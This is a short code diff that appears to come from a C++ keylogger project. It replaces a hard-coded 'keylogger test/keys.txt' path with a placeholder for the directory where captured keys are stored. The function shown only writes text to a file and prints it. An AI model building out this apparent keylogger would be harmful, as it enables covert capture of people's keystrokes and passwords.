@@ -9,7 +9,7 @@ using namespace std;
 void writeData(string text)
 {
 	ofstream f;
-	f.open("C:/Users/NiceTry/Desktop/keylogger test/keys.txt");
+	f.open("////////YOUR DIRECTORY YOU WANT KEYS STORED IN GOES HERE\\\\\\\\\\\\\");
 	f << text;
 	f.close();
 	cout << text;
